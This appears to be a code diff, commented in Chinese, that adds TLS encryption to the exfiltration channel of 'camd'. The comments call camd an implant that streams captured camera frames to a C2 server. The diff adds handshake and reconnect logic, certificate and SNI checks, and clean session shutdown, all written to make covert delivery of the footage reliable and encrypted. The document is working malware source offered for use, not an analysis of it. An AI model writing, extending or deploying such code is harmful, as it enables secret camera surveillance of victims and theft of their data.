@@ -26,6 +26,10 @@
 #include "exfil_link.h"
 #include "p2p_cell.h"
 
+/* 自研 TLS 1.2 客户端。仅在 sink 是 tls:// 时使用，但无条件包含——
+ * 若做成编译期可选，默认路径就永远不被测试覆盖，那是恒绿的温床。 */
+#include "tls.h"
+
 #include <errno.h>
 #include <fcntl.h>
 #include <signal.h>
@@ -144,10 +148,105 @@ typedef struct {
     char         host[256];
     char         port[16];
     uint32_t     reconnects;   /* 成功重连次数，供 status 观测 */
+
+    /* TLS 出口状态。tls != NULL 表示本出口跑在 TLS 记录层之上。
+     *
+     * tls_handshakes 与 reconnects 分开计数：TCP 重连成功但握手失败是
+     * 一种独立的故障形态（例如对端证书过期、或中间人只转发不握手）。
+     * 只记 reconnects 会让这种故障看起来像"重连正常但没数据"。 */
+    tls_ctx     *tls;
+    char         sni[256];
+    char         ca[4096];
+    int          verify;
+    uint32_t     tls_handshakes;
+
+    /* "是否 TLS 出口"与"当前是否有 ctx"必须是两个字段。
+     *
+     * 握手失败时 tls 会被置 NULL（见 cd_tls_handshake），若只靠 tls 判
+     * 断出口类型，一次握手失败就会把 tls:// 出口静默降级成明文——
+     * 后续帧全部以明文发出，而代码里没有任何一处会再想起它是 TLS。
+     * 配置态与运行态分离，正是为了堵这个降级通道。 */
+    int          use_tls;
 } cd_sink_t;
 
 /* 前向声明：cd_write_all 定义在前，写失败时要回调重连。 */
 static int cd_sink_reconnect(cd_sink_t *s);
+static int cd_tls_handshake(cd_sink_t *s);
+
+/* ---- TLS 记录层的 IO 回调 ----
+ *
+ * 25_tls 把 IO 做成回调注入，因此同一套 TLS 实现可以跑在 socket、
+ * 代理隧道或域前置层之上。这里注入的就是 camd 自己的 sink fd。
+ *
+ * 返回值必须是**实际发出的字节数**，不是 0/-1 的成功失败标志。
+ *
+ * 这一条与 tls.h 顶部的注释相反，实测踩过：tls.h 写"发送：返回 0 成功"，
+ * 但 tls.c 的 io_send_all 是 `off += (size_t)r; if (r <= 0) return
+ * TLS_ERR_IO;` —— 把返回值当字节数累加。照注释返回 0 的结果是：第一次
+ * 发送（5 字节记录头）刚成功，就地被判 IO 错误，握手报 transport error，
+ * 而对端只看到连接被关掉（SSLEOFError）。既有实现 test_tls.c:45 返回的
+ * 是字节数，那才是真契约。
+ *
+ * send 必须用 MSG_NOSIGNAL：对端关闭后裸 send 触发 SIGPIPE 会直接杀死
+ * 常驻进程（该信号已在 tcp:// 分支里 SIG_IGN，此处双保险——若有人把
+ * 那处 SIG_IGN 挪走，这里仍然安全）。 */
+static int cd_tls_send(void *arg, const uint8_t *data, size_t len)
+{
+    cd_sink_t *s = (cd_sink_t *)arg;
+    if (!s || s->sink_fd < 0) return -1;
+    ssize_t n = send(s->sink_fd, data, len, MSG_NOSIGNAL);
+    return (int)n;              /* <=0 由 io_send_all 判为失败 */
+}
+
+/* 契约：返回读到的字节数，<=0 视为失败/关闭。
+ * recv 返回 0 即对端 FIN，正好落进这个语义，无需额外分支。 */
+static int cd_tls_recv(void *arg, uint8_t *buf, size_t cap)
+{
+    cd_sink_t *s = (cd_sink_t *)arg;
+    if (!s || s->sink_fd < 0 || cap == 0) return -1;
+    ssize_t n = recv(s->sink_fd, buf, cap, 0);
+    return (int)n;
+}
+
+/*
+ * 在已建立的 TCP 之上完成 TLS 握手。可重入：会先释放上一次的 ctx。
+ *
+ * 重连后**必须**重新握手——TLS 会话状态绑在连接上，复用旧 ctx 写新
+ * socket 会产出对端无法解密的记录；更坏的情况是 tls_write 静默成功，
+ * 表现为"在发但 C2 一帧都收不到"。
+ */
+static int cd_tls_handshake(cd_sink_t *s)
+{
+    if (!s) return -1;
+    if (s->sink_fd < 0) return -1;
+
+    if (s->tls) { tls_free(s->tls); s->tls = NULL; }
+
+    tls_config cfg;
+    memset(&cfg, 0, sizeof cfg);
+    cfg.sni         = s->sni[0] ? s->sni : NULL;
+    cfg.verify_host = s->sni[0] ? s->sni : NULL;
+    cfg.ca_path     = s->ca[0]  ? s->ca  : NULL;
+    cfg.verify      = s->verify;
+    cfg.alpn        = NULL;      /* 信元是裸流，不跑 HTTP/2 */
+
+    tls_err e = tls_client_init(&s->tls, &cfg, cd_tls_send, cd_tls_recv, s);
+    if (e != TLS_OK || !s->tls) {
+        fprintf(stderr, "[FATAL] TLS 客户端初始化失败: %s\n", tls_errstr(e));
+        s->tls = NULL;
+        return -1;
+    }
+
+    e = tls_handshake(s->tls);
+    if (e != TLS_OK) {
+        fprintf(stderr, "[FATAL] TLS 握手失败: %s\n", tls_errstr(e));
+        tls_free(s->tls);
+        s->tls = NULL;
+        return -1;
+    }
+    s->tls_handshakes++;
+    return 0;
+}
 
 /*
  * 写出信元。
@@ -163,6 +262,22 @@ static int cd_sink_reconnect(cd_sink_t *s);
 static int cd_write_all(cd_sink_t *s, const uint8_t *buf, size_t n)
 {
     if (!s || s->sink_fd < 0) return -1;
+
+    /* TLS 出口：写的是 TLS 记录，不是裸字节。
+     *
+     * 顺序要紧——必须先判 tls 再判 is_sock，否则 TLS 出口会走成明文
+     * send()，把记录层绕过。那时的现象极具误导性：C2 收到的前几个
+     * 字节恰好是 ClientHello，但后续全是裸信元，握手永远完不成，
+     * 而 camd 侧看起来"写成功了"。 */
+    if (s->tls) {
+        if (tls_write(s->tls, buf, n) == TLS_OK) return 0;
+
+        /* 写失败 → 重连（cd_sink_reconnect 内部会重新握手）后重试一次。
+         * 与明文分支同理由：只重试一次，下一批采集会自然再试。 */
+        if (s->host[0] && cd_sink_reconnect(s) == 0 && s->tls)
+            return (tls_write(s->tls, buf, n) == TLS_OK) ? 0 : -1;
+        return -1;
+    }
 
     if (s->is_sock) {
         if (exfil_link_write_all(s->sink_fd, buf, n) == 0) return 0;
@@ -253,17 +368,19 @@ static int cd_exfil(const uint8_t *data, size_t len, const char *name, void *ud)
  */
 
 /*
- * 解析 "tcp://host:port"。
+ * 解析 "host:port"（scheme 前缀已由调用方剥离）。
+ *
+ * tcp:// 与 tls:// 共用本函数：两者前缀同为 6 字符，剥离后格式一致。
+ * 不在这里判 scheme —— 判定属于 sink_open 的分派逻辑，混进来会让本函数
+ * 无法被第二个 scheme 复用。
  *
  * IPv6 字面量含冒号，用 strrchr 取最后一个冒号而不是 strchr 取第一个，
- * 否则 "tcp://[::1]:9000" 会被切成 host="[" port="::1]:9000"。
+ * 否则 "[::1]:9000" 会被切成 host="[" port="::1]:9000"。
  * 支持 "[::1]:9000" 的方括号形式，剥掉方括号后再交给 getaddrinfo。
  */
-static int cd_parse_tcp(const char *spec, char *host, size_t hcap,
-                        char *port, size_t pcap)
+static int cd_parse_hostport(const char *hp, char *host, size_t hcap,
+                             char *port, size_t pcap)
 {
-    if (strncmp(spec, "tcp://", 6) != 0) return -1;
-    const char *hp = spec + 6;
     if (!*hp) return -1;
 
     const char *colon = strrchr(hp, ':');
@@ -283,6 +400,25 @@ static int cd_parse_tcp(const char *spec, char *host, size_t hcap,
     memcpy(host, hs, hlen); host[hlen] = '\0';
     memcpy(port, colon + 1, plen); port[plen] = '\0';
     return 0;
+}
+
+/*
+ * 判定 host 是否为 IP 字面量（IPv4 点分十进制或 IPv6 含冒号）。
+ *
+ * 用途：RFC 6066 明确禁止在 SNI 里填 IP 字面量。因此目标是 IP 时不能
+ * 拿它去当 SNI，也不能用它做证书主机名校验——那种情况下"校验"要么
+ * 恒失败，要么被实现悄悄跳过，两种都不是我们想要的结果。
+ */
+static int cd_is_ip_literal(const char *h)
+{
+    if (!h || !*h) return 0;
+    if (strchr(h, ':')) return 1;               /* IPv6 */
+    int dots = 0;
+    for (const char *p = h; *p; p++) {
+        if (*p == '.') { dots++; continue; }
+        if (*p < '0' || *p > '9') return 0;
+    }
+    return dots == 3;                            /* IPv4 */
 }
 
 /* 建一条 TCP 连接。成功返回 fd，失败返回 -1。 */
@@ -335,6 +471,10 @@ static int cd_sink_reconnect(cd_sink_t *s)
     s->sink_fd   = fd;
     s->sink_owned = 1;
     s->is_sock   = 1;
+
+    /* TLS 会话绑在连接上：新 TCP 必须重新握手，不能沿用旧 ctx。 */
+    if (s->use_tls && cd_tls_handshake(s) != 0) return -1;
+
     s->reconnects++;
     return 0;
 }
@@ -354,9 +494,11 @@ static int cd_sink_open(const char *spec, cd_sink_t *s)
         return 0;
     }
 
-    if (strncmp(spec, "tcp://", 6) == 0) {
-        if (cd_parse_tcp(spec, s->host, sizeof s->host,
-                         s->port, sizeof s->port) != 0) return -1;
+    /* "tcp://" 与 "tls://" 前缀同为 6 字符，共用 host:port 解析 */
+    int is_tls = (strncmp(spec, "tls://", 6) == 0);
+    if (strncmp(spec, "tcp://", 6) == 0 || is_tls) {
+        if (cd_parse_hostport(spec + 6, s->host, sizeof s->host,
+                              s->port, sizeof s->port) != 0) return -1;
 
         /* SIGPIPE 必须忽略。
          *
@@ -372,6 +514,36 @@ static int cd_sink_open(const char *spec, cd_sink_t *s)
         s->sink_fd    = fd;
         s->sink_owned = 1;
         s->is_sock    = 1;
+
+        if (is_tls) {
+            s->use_tls = 1;
+
+            /* 守卫 A：要求校验证书却没有信任库 → 拒绝启动。
+             *
+             * 不校验的 TLS 只防被动流量识别，不防主动冒充：任何人都能用
+             * 自签证书接管连接，让植入体把画面持续发给自己（内容它解不
+             * 开，但能测出哪些主机在线，并形成黑洞）。因此"不校验"必须
+             * 是显式选择，而不是"忘了给 --ca"的默认值。 */
+            if (s->verify && !s->ca[0]) {
+                fprintf(stderr, "[FATAL] tls:// 出口要求校验证书，但未指定 --ca\n");
+                return -1;
+            }
+
+            /* SNI 未显式给定时从 host 推导（IP 字面量不可作 SNI）。 */
+            if (!s->sni[0] && !cd_is_ip_literal(s->host))
+                snprintf(s->sni, sizeof s->sni, "%s", s->host);
+
+            /* 守卫 B：要求主机名校验却拿不出主机名 → 拒绝启动。
+             * 否则要么校验恒失败（连不上），要么被实现静默跳过（等于
+             * 没校验却以为校验了）——后者最坏。 */
+            if (s->verify && !s->sni[0]) {
+                fprintf(stderr, "[FATAL] tls:// 出口要求主机名校验，但目标是 IP"
+                                " 字面量且未指定 --sni\n");
+                return -1;
+            }
+
+            if (cd_tls_handshake(s) != 0) return -1;
+        }
         return 0;
     }
 
@@ -394,6 +566,17 @@ static int cd_fd_is_socket(int fd)
 
 static void cd_sink_close(cd_sink_t *s)
 {
+    /* 先发 close_notify，再关 fd，最后释放 ctx。
+     *
+     * 顺序反了（或干脆不发）的后果在 tls.h 里写明了：对端只能看到 TCP
+     * 被关掉，真实实现会报 "unexpected eof while reading" 并把整条连接
+     * 判为异常结束——握手、应用数据全对，整段会话仍被记为错误。
+     * c2_sink.py 侧表现为该连接被记成读异常，而字节其实都收到了。 */
+    if (s->tls) {
+        (void)tls_close(s->tls);
+        tls_free(s->tls);
+        s->tls = NULL;
+    }
     if (s->sink_owned && s->sink_fd >= 0) close(s->sink_fd);
     s->sink_fd = -1;
     s->sink_owned = 0;
@@ -467,6 +650,12 @@ int cam_daemon_run(const cam_daemon_cfg_t *cfg, cam_daemon_stats_t *out_stats)
     cd_sink_t sink;
     memset(&sink, 0, sizeof sink);
     sink.name = "camera";
+
+    /* TLS 出口参数。仅当 sink_path 是 tls:// 时被 cd_sink_open 取用；
+     * 明文出口下这些字段被忽略，不为零也不影响既有路径。 */
+    if (cfg->tls_ca)  snprintf(sink.ca,  sizeof sink.ca,  "%s", cfg->tls_ca);
+    if (cfg->tls_sni) snprintf(sink.sni, sizeof sink.sni, "%s", cfg->tls_sni);
+    sink.verify = cfg->tls_verify;
 
     if (exfil_chan_init(&sink.chan, ks, kr, pf, 0) != 0) {
         if (out_stats) *out_stats = st;
